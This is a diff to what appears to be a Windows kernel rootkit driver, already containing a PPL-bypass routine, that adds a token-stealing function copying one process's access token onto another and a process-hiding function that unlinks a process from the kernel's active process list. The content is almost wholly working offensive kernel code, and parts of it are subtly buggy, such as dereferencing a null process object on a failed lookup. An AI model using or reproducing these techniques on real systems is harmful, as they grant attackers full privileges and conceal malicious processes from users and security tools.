@@ -551,6 +551,64 @@ NTSTATUS pplBypass(UINT64 pidVal, int offset) {
 
 }
 
+NTSTATUS procTokenSwap(DWORD pid1,DWORD pid2, int offset) {
+	NTSTATUS status;
+	PEPROCESS eProcess1 = NULL;
+	PEPROCESS eProcess2 = NULL;
+
+	status = PsLookupProcessByProcessId((HANDLE)pid1, &eProcess1);
+    if (!NT_SUCCESS(status)) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+            "[%s] PsLookupProcessByProcessId failed for PID %llu (0x%08X)\n",
+            DRIVER_NAME, (unsigned long long)pid1, status);
+        return STATUS_UNSUCCESSFUL;
+	}
+
+    status = PsLookupProcessByProcessId((HANDLE)pid2, &eProcess2);
+    if (!NT_SUCCESS(status)) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+            "[%s] PsLookupProcessByProcessId failed for PID %llu (0x%08X)\n",
+            DRIVER_NAME, (unsigned long long)pid2, status);
+        ObDereferenceObject(eProcess2);
+        return STATUS_UNSUCCESSFUL;
+	}
+
+	DbgPrintEx(0, 0, "trying to copy token from pid %d to pid %d\n", pid2, pid1);
+    
+    *(PUINT64)((UINT64)eProcess1 + offset) = *(PUINT64)((UINT64)eProcess2 + offset);
+
+	ObDereferenceObject(eProcess1);
+	ObDereferenceObject(eProcess2);
+    return STATUS_SUCCESS;
+}
+
+NTSTATUS procHiding(DWORD pidVal, int offset) {
+	NTSTATUS status;
+
+    PEPROCESS eProcess = NULL;
+    status = PsLookupProcessByProcessId((HANDLE)pidVal, &eProcess);
+    if (!NT_SUCCESS(status)) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+            "[%s] PsLookupProcessByProcessId failed for PID %llu (0x%08X)\n",
+            DRIVER_NAME, (unsigned long long)pidVal, status);
+        return STATUS_UNSUCCESSFUL;
+	}
+
+    LIST_ENTRY* listEntry = (LIST_ENTRY*)((UINT64)eProcess + offset);
+	listEntry->Flink->Blink = listEntry->Blink;
+	listEntry->Blink->Flink = listEntry->Flink;
+    
+    if (listEntry->Flink == listEntry && listEntry->Blink == listEntry) {
+        DbgPrintEx(0, 0, "[%s] Successfully removed process from active process list for PID %llu\n", DRIVER_NAME, (unsigned long long)pidVal);
+    }
+    else {
+        DbgPrintEx(0, 0, "[%s] Failed to remove process from active process list for PID %llu\n", DRIVER_NAME, (unsigned long long)pidVal);
+        ObDereferenceObject(eProcess);
+        return STATUS_UNSUCCESSFUL;
+	}
+	return STATUS_SUCCESS;
+}
+
 UINT64 FindKernelBase() {
     UNICODE_STRING functionName;
     PFN_ZwQuerySystemInformation querySysInfo;
